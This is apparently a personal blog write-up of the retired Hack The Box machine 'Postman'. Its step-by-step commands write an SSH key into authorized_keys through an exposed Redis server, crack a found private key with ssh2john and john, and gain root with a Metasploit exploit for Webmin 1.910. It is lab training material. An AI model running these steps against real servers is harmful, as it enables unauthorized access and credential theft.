---
layout: default
---
## Postman
###### Retired March 2020
![](https://www.hackthebox.eu/storage/avatars/ad38e890e4e93afce51118bec4b9f48b.png)

I think and hope this is my last writeup before I discovered [Greenshot](https://getgreenshot.org/). Just want to show love for a great application. Postman was a really easy machine loaded up with a couple of quick CVEs that exploited Redis for user and Webin for root. I’ve already added the machine to my /etc/hosts file as postman.htb. As always, I started with ```nmap```.

```bash
nmap -T5 -A -p 1-65535 postman.htb -n -oN nmap.results
```

![](https://yaboygmoney.github.io/htb/images/postman/nmap.JPG)

nmap showed that SSH, HTTP, Redis, and Webmin MiniServ were available on this machine. I did a quick glance at the website. 

![](https://yaboygmoney.github.io/htb/images/postman/website.JPG)

Nothing much was going on with the main page in the source. I ran gobuster and found some directories that sounded interesting but didn’t provide anything. That was expected, as the other services looked a little more interesting.

Checking out Redis version 4.0.9, I was quickly pointed to an [RCE exploit](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html). I checked for remote command execution vulnerability of the remote host with telnet first.

```bash
telnet postman.htb 6379
ECHO "Vulnerable"
```

![](https://yaboygmoney.github.io/htb/images/postman/vulncheck.JPG)

The system echoing back is a good sign. To take advantage of this exploit, I first needed to get redis tools. 

```bash 
apt-get install redis-tools
```

From there, it’s as easy as following the [CVE](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html).

```bash
ssh-keygen -t rsa -C “redis@postman.htb”
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
redis-cli -h postman.htb flushall
cat foo.txt | redis-cli -h postman.htb -x set crackit
redis-cli -h postman.htb
config get dir
config set dbfilename “authorized_keys”
save
```

![](https://yaboygmoney.github.io/htb/images/postman/sshprep.JPG)

Now I’m set to use the new key I just generated.

```bash
ssh -i id_rsa redis@postman.htb
```

![](https://yaboygmoney.github.io/htb/images/postman/redisLogin.JPG)

Successfully logged in, I can see that there’s only a single user’s home directory present: Matt. I half-heartedly try to cat the user flag and, as expected, am denied.

![](https://yaboygmoney.github.io/htb/images/postman/denied.JPG)

During enumeration, I found a backup file “id_rsa.bak”. A quick way to do this is to run

```bash
locate *.bak
```

![](https://yaboygmoney.github.io/htb/images/postman/locate.JPG)

An RSA private key. I copied the contents of that file back into gedit and saved it. Then, I ran it against the tool ssh2john. This tool converts an SSH key to a hash that John can crack.

```bash
/usr/share/john/ssh2john.py mattkey > mattkey.hash
```

After I’ve converted the key to a hash, I can run john against it to carve out the password.

```bash
john –wordlist=/usr/share/wordlists/rockyou.txt mattkey.hash
```

![](https://yaboygmoney.github.io/htb/images/postman/cracked.JPG)

I’ve now got a full-fledged set of creds: Matt:computer2008. Now that I have Matt’s password, I can ```su``` to Matt and get the user flag from the redis ssh session.

![](https://yaboygmoney.github.io/htb/images/postman/user.JPG)

Looking back at the nmap results, Webmin MiniServ 1.910 is served up on port 10000. There is an ![exploit]( https://www.exploit-db.com/exploits/46984) created for this version for any authenticated user to execute the package updates module as root. I downloaded the exploit and loaded it into my Metasploit exploits.

```bash
cd ~/.msf4/modules/exploits/linux
wget https://www.exploit-db.com/exploits/46984
msfconsole
```
Then I queue the exploit.

![](https://yaboygmoney.github.io/htb/images/postman/payload1.JPG)

I tried sending that configuration and got an error, no session. Then I remembered that the Webmin server was running on HTTPS and set SSL to True in Metasploit and fired again.

![](https://yaboygmoney.github.io/htb/images/postman/rooted.JPG)

Success. The CVE is exploited.

Until next time.

#### Keep trying
